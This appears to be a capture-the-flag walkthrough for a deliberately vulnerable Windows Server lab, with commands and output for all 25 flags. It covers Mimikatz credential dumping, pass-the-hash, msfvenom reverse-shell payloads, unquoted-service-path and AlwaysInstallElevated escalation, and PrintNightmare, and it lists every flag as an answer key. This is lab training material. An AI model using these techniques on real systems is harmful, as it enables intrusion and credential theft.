# Windows Server 2019 (WIN-TIP7RVRBJ8E) CTF Flag Capture Guide
## Pokemon CTF v5 - Complete Flag Instructions

### Environment Setup
- **Target Server IP**: 192.168.1.22 (WIN-TIP7RVRBJ8E)
- **Attacker Kali IP**: 192.168.1.7
- **Total Flags**: 25
- **Total Points**: 680

### Prerequisites
Before starting, ensure you have:
- Kali Linux with standard penetration testing tools
- Evil-WinRM installed (`gem install evil-winrm`)
- Impacket tools installed
- Mimikatz.exe ready for upload
- Python HTTP server for file transfers

---

## Initial Reconnaissance Phase

### FLAG 018: SSH Banner (10 points)
**Discovery Method**: SSH connection attempt reveals flag in banner
```bash
# From Kali (192.168.1.7):
ssh 192.168.1.22

# The banner will display:
# Welcome to Vulnerable SSH Server
# FLAG{ZAPDOS69523431}

# Press Ctrl+C to cancel the connection
```

---

## User Enumeration Flags

### FLAG 001: Admin User Description (10 points)
**Discovery Method**: RPC enumeration reveals flag in user description
```bash
# Connect via RPC with null session
rpcclient -U "" -N 192.168.1.22

# At the rpcclient prompt:
rpcclient $> enumdomusers
# This lists all users

rpcclient $> queryuser admin
# Look for the Description field containing:
# Description :   FLAG{PIKACHU15097304}

rpcclient $> quit
```

### FLAG 002: Hidden User Account (15 points)
**Discovery Method**: RID cycling discovers hidden user with flag as username
```bash
# Use Impacket's lookupsid tool
impacket-lookupsid guest@192.168.1.22 -no-pass

# Scan through the output for RID 1078
# You'll find: 1078: WIN-TIP7RVRBJ8E\FLAG{MEW1078} (SidTypeUser)
```

---

## Password Discovery and Initial Access

### Discovering Valid Credentials
First, perform password spraying to find valid credentials:
```bash
# Create user list
cat > server_users.txt << EOF
Administrator
admin
backup
service
test
sqlservice
svc_print
debugger
EOF

# Create password list
cat > server_passwords.txt << EOF
Password123!
admin
admin123
backup123
service
test
sql2019
PrintService123
Debug2024!
EOF

# Perform password spray
crackmapexec smb 192.168.1.22 -u server_users.txt -p server_passwords.txt --continue-on-success
```

**Valid Credentials Found**:
- admin:admin
- backup:backup123
- service:service
- test:test
- sqlservice:sql2019
- svc_print:PrintService123
- debugger:Debug2024!
- Administrator:Password123!

---

## SMB Share Exploitation

### FLAG 007: Public Share Discovery (10 points)
**Location**: Public share accessible without authentication
```bash
# Connect to Public share without credentials
smbclient //192.168.1.22/Public -N

# At the SMB prompt:
smb: \> ls
smb: \> get flag.txt
smb: \> !cat flag.txt
# Output: FLAG{DRAGONITE22009185}
smb: \> quit
```

### FLAG 010: Password File in Public Share (15 points)
**Location**: passwords.txt in Public share
```bash
# Connect to Public share
smbclient //192.168.1.22/Public -N

smb: \> get passwords.txt
smb: \> !cat passwords.txt
# Contains: FLAG{MACHAMP06770292}
smb: \> quit
```

### FLAG 008: Backup Share Access (20 points)
**Location**: Backup share requires authentication
```bash
# Connect with credentials
smbclient //192.168.1.22/Backup -U admin%admin

smb: \> ls
smb: \> get flag.txt
smb: \> !cat flag.txt
# Output: FLAG{SNORLAX62596879}
smb: \> quit
```

### FLAG 011: SAM Backup Information (45 points)
**Location**: SAM backup info in Backup share
```bash
# Connect to Backup share
smbclient //192.168.1.22/Backup -U admin%admin

smb: \> get sam_backup_info.txt
smb: \> !cat sam_backup_info.txt
# Contains: Flag: FLAG{GYARADOS99305915}
smb: \> quit
```

### FLAG 009: IT Share Authentication (30 points)
**Location**: IT share requires valid credentials
```bash
# Connect with credentials
smbclient //192.168.1.22/IT -U admin%admin

smb: \> ls
smb: \> get flag.txt
smb: \> !cat flag.txt
# Output: FLAG{ALAKAZAM49155037}
smb: \> quit
```

### FLAG 012: Alternate Data Stream (40 points)
**Location**: Hidden ADS in normal.txt file
```bash
# Connect via Evil-WinRM
evil-winrm -i 192.168.1.22 -u admin -p admin

# Navigate and check ADS
*Evil-WinRM* PS C:\Users\admin\Documents> cd C:\Public
*Evil-WinRM* PS C:\Public> Get-Item normal.txt -Stream *
# Shows hidden stream exists

*Evil-WinRM* PS C:\Public> Get-Content normal.txt -Stream hidden
# Output: FLAG{LAPRAS77371564}
```

---

## Memory Exploitation with Mimikatz

### FLAG 003: LSASS Memory Dump (45 points)
**Location**: WDigest credentials in memory
```bash
# In Evil-WinRM session as admin:
*Evil-WinRM* PS C:\Users\admin\Documents> cd C:\Temp

# Download Mimikatz (ensure Python HTTP server is running on Kali)
# On Kali: python3 -m http.server 8000
*Evil-WinRM* PS C:\Temp> certutil -urlcache -f http://192.168.1.7:8000/mimikatz.exe mimikatz.exe

# Run Mimikatz
*Evil-WinRM* PS C:\Temp> .\mimikatz.exe

# In Mimikatz prompt:
mimikatz # privilege::debug
# Output: Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
# Look in the wdigest section for:
# * Flag     : FLAG{BULBASAUR23051655}

mimikatz # exit
```

### FLAG 004: Debug Privilege Exploitation (40 points)
**Location**: Registry key accessible with debug privileges
```bash
# Login as debugger user
evil-winrm -i 192.168.1.22 -u debugger -p Debug2024!

# Query the special registry key
*Evil-WinRM* PS C:\Users\debugger\Documents> reg query HKLM\SOFTWARE\DebugFlags /v Flag
# Output: Flag    REG_SZ    FLAG{SQUIRTLE32403089}
```

### FLAG 005: Pass-the-Hash Success (50 points)
**Location**: File accessible only after PTH attack
```bash
# Use the NTLM hash extracted from Mimikatz (209c6174da490caeb422f3fa5a7ae634)
# From Kali:
impacket-psexec -hashes :209c6174da490caeb422f3fa5a7ae634 admin@192.168.1.22

# In the SYSTEM shell:
C:\Windows\system32> type C:\Windows\System32\config\systemprofile\pth_success.txt
# Output: FLAG{MEWTWO42298929}
C:\Windows\system32> exit
```

---

## Service Vulnerability Exploitation

### FLAG 013: Unquoted Service Path #1 (25 points)
**Location**: Exploiting VulnScanner service
```bash
# First, create exploit on Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe > Vulnerable.exe

# Start listener on Kali:
nc -lvnp 4444

# In Evil-WinRM session (new terminal):
evil-winrm -i 192.168.1.22 -u admin -p admin

# Upload exploit
*Evil-WinRM* PS C:\> upload Vulnerable.exe "C:\Program Files\Vulnerable.exe"

# Restart the vulnerable service
*Evil-WinRM* PS C:\> Restart-Service VulnScanner

# In your netcat listener, you'll get SYSTEM shell:
C:\Windows\system32> whoami
# Output: nt authority\system

C:\Windows\system32> type C:\flag_unquoted1.txt
# Output: FLAG{EEVEE05582770}
```

### FLAG 014: Unquoted Service Path #2 (30 points)
**Location**: Exploiting CommonAppService
```bash
# Using same exploit and listener from FLAG 013
# In Evil-WinRM:
*Evil-WinRM* PS C:\> copy "C:\Program Files\Vulnerable.exe" "C:\Program Files\Common.exe"
*Evil-WinRM* PS C:\> Restart-Service CommonAppService

# In SYSTEM shell:
C:\Windows\system32> type C:\flag_unquoted2.txt
# Output: FLAG{VAPOREON64436018}
```

### FLAG 015: Unquoted Service Path #3 (35 points)
**Location**: Exploiting VendorUpdater service
```bash
# In Evil-WinRM:
*Evil-WinRM* PS C:\> copy "C:\Program Files\Vulnerable.exe" "C:\Program Files (x86)\Vendor.exe"
*Evil-WinRM* PS C:\> Restart-Service VendorUpdater

# In SYSTEM shell:
C:\Windows\system32> type C:\flag_unquoted3.txt
# Output: FLAG{JOLTEON52080210}
```

### FLAG 016: AlwaysInstallElevated MSI (40 points)
**Location**: Exploiting AlwaysInstallElevated policy
```bash
# On Kali, create malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=5555 -f msi -o evil.msi

# Start new listener:
nc -lvnp 5555

# In Evil-WinRM session:
*Evil-WinRM* PS C:\> mkdir C:\Temp 2>$null
*Evil-WinRM* PS C:\> upload evil.msi C:\Temp\evil.msi
*Evil-WinRM* PS C:\> msiexec /quiet /qn /i C:\Temp\evil.msi

# In SYSTEM shell:
C:\Windows\system32> type C:\Windows\System32\config\systemprofile\msi_flag.txt
# Output: FLAG{FLAREON04930613}
```

### FLAG 017: PrintNightmare Exploitation (45 points)
**Location**: Exploiting Print Spooler vulnerability
```bash
# On Kali, setup PrintNightmare exploit:
git clone https://github.com/cube0x0/CVE-2021-34527.git
cd CVE-2021-34527

# Create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=6666 -f dll > nightmare.dll

# Start SMB server and listener
impacket-smbserver share . -smb2support
nc -lvnp 6666

# Run exploit
python3 CVE-2021-34527.py 'admin:admin@192.168.1.22' '\\192.168.1.7\share\nightmare.dll'

# In SYSTEM shell:
C:\Windows\system32> type C:\Windows\System32\spool\drivers\color\printnightmare_flag.txt
# Output: FLAG{ARTICUNO51674662}
```

---

## Additional System Flags

### FLAG 006: RDP Certificate Registry (20 points)
**Location**: Terminal Server registry key
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v CertificateComment
# Output: CertificateComment    REG_SZ    FLAG{GENGAR79085546}
```

### FLAG 019: SSH Authorized Keys (30 points)
**Location**: SSH configuration file
```bash
# Connect via SSH
ssh admin@192.168.1.22
# Password: admin

# In Windows SSH session:
C:\Users\admin> type C:\ProgramData\ssh\authorized_keys
# Contains comment: # FLAG{MOLTRES46773297}
C:\Users\admin> exit
```

### FLAG 020: Service Description (15 points)
**Location**: WeakPermService description
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> sc.exe qdescription WeakPermService
# Output: DESCRIPTION:  Weak Permission Service - FLAG{DRATINI36669962}
```

---

## Registry and Persistence Flags

### FLAG 021: Scheduled Task (25 points)
**Location**: VulnTask scheduled task
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> schtasks /query /tn VulnTask /fo LIST /v | findstr "Task To Run"
# Shows the command that creates the flag

# Run the task
*Evil-WinRM* PS C:\> schtasks /run /tn VulnTask

# Read the created flag
*Evil-WinRM* PS C:\> Get-Content C:\Public\taskflag.txt
# Output: FLAG{MEOWTH07392744}
```

### FLAG 022: Registry HKLM (15 points)
**Location**: VulnApp registry key
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\VulnApp /v LicenseKey
# Output: LicenseKey    REG_SZ    FLAG{PSYDUCK54980620}
```

### FLAG 023: Registry HKCU Run (25 points)
**Location**: Current user Run key
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Shows: UpdaterFlag    REG_SZ    cmd /c echo FLAG{ARCANINE90001831}

# Execute the command to verify
*Evil-WinRM* PS C:\> cmd /c echo FLAG{ARCANINE90001831}
# Output: FLAG{ARCANINE90001831}
```

### FLAG 024: Service Registry (35 points)
**Location**: VulnScanner service registry
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnScanner /v Flag
# Output: Flag    REG_SZ    FLAG{POLIWAG65286589}
```

---

## Web Application Flag

### FLAG 025: HTML Comment (10 points)
**Location**: Hidden in web page source
```bash
# From Kali:
curl http://192.168.1.22/vulnapp/login.html | grep -i flag
# Output will show: <!-- FLAG{ABRA50761953} -->
```

---

## Summary

### Total Flags Captured: 25
### Total Points: 680

### Flag Summary Table
| Flag # | Pokemon | Points | Method |
|--------|---------|--------|--------|
| 001 | PIKACHU | 10 | RPC User Description |
| 002 | MEW | 15 | Hidden User RID |
| 003 | BULBASAUR | 45 | Mimikatz WDigest |
| 004 | SQUIRTLE | 40 | Debug Privilege |
| 005 | MEWTWO | 50 | Pass-the-Hash |
| 006 | GENGAR | 20 | RDP Registry |
| 007 | DRAGONITE | 10 | Public Share |
| 008 | SNORLAX | 20 | Backup Share |
| 009 | ALAKAZAM | 30 | IT Share |
| 010 | MACHAMP | 15 | Password File |
| 011 | GYARADOS | 45 | SAM Backup |
| 012 | LAPRAS | 40 | Alternate Data Stream |
| 013 | EEVEE | 25 | Unquoted Path #1 |
| 014 | VAPOREON | 30 | Unquoted Path #2 |
| 015 | JOLTEON | 35 | Unquoted Path #3 |
| 016 | FLAREON | 40 | AlwaysInstallElevated |
| 017 | ARTICUNO | 45 | PrintNightmare |
| 018 | ZAPDOS | 10 | SSH Banner |
| 019 | MOLTRES | 30 | SSH Keys |
| 020 | DRATINI | 15 | Service Description |
| 021 | MEOWTH | 25 | Scheduled Task |
| 022 | PSYDUCK | 15 | Registry HKLM |
| 023 | ARCANINE | 25 | Registry Run |
| 024 | POLIWAG | 35 | Service Registry |
| 025 | ABRA | 10 | HTML Comment |

### Tools Required
- Evil-WinRM
- Impacket suite
- Mimikatz
- Metasploit (msfvenom)
- Standard Kali tools (smbclient, rpcclient, curl, netcat)
- PrintNightmare exploit script

### Key Vulnerabilities Exploited
1. Weak/default passwords
2. SMB null sessions
3. Unquoted service paths
4. AlwaysInstallElevated policy
5. PrintNightmare (CVE-2021-34527)
6. WDigest credential storage
7. Pass-the-Hash vulnerability
8. Information disclosure in registry/files

---

*Remember: These techniques should only be used in authorized testing environments.*